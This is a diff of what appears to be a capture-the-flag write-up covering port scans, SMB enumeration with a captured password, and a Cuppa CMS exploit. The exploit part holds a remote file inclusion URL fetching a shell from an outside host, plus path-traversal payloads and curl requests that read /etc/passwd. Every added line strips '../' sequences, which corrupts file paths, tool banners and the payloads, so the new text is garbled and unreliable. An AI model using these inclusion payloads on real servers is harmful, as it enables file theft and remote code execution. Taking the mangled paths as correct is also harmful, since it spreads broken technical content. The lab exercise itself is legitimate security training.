@@ -23,7 +23,7 @@ ________________________________________
  --------------------------------------
 To scan or not to scan? That is the question.
 
-[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
+[~] The config file is expected to be at "/home/rustscanrustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.49.187.112:22
@@ -61,7 +61,7 @@ PORT    STATE SERVICE      REASON
 143/tcp open  imap         syn-ack
 445/tcp open  microsoft-ds syn-ack
 
-Read data files from: /usr/bin/../share/nmap
+Read data files from: /usr/bin./share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/a44dd429-3679-488b-a28e-f09861cdff56/image.png)
@@ -914,7 +914,7 @@ enum4linux complete on Sun Nov 30 18:37:47 2025
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+   \___  \    /\  \    ||:     \/   /\   \    |   /' /\  \     |:  ____/
     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
@@ -941,7 +941,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+   \___  \    /\  \    ||:     \/   /\   \    |   /' /\  \     |:  ____/
     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
@@ -970,7 +970,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+   \___  \    /\  \    ||:     \/   /\   \    |   /' /\  \     |:  ____/
     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
@@ -1010,7 +1010,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+   \___  \    /\  \    ||:     \/   /\   \    |   /' /\  \     |:  ____/
     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
@@ -1325,7 +1325,7 @@ smbmap -u milesdyson -p ')s{A&2Z=F^n_E.B`' -H 10.49.187.112
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+   \___  \    /\  \    ||:     \/   /\   \    |   /' /\  \     |:  ____/
     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
@@ -1598,7 +1598,7 @@ EXPLOIT
 #####################################################
 
 http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=........../etc/passwd
 
 Moreover, We could access Configuration.php source code via PHPStream
 
@@ -1644,7 +1644,7 @@ Able to read sensitive information via File Inclusion (PHP Stream)
 > RCE vulnerability
 > local or remote PHP files or read 
 
-http://10.49.187.112/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+http://10.49.187.112/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=........../etc/passwd
 
 Field configuration:
 root:x:0:0:root:/root:/bin/bash
@@ -1699,7 +1699,7 @@ nc -lvnp 1234
 ```
 
 > LFI test
-curl "http://10.49.187.112/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"
+curl "http://10.49.187.112/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=........../etc/passwd"
 
 
 > file serviing
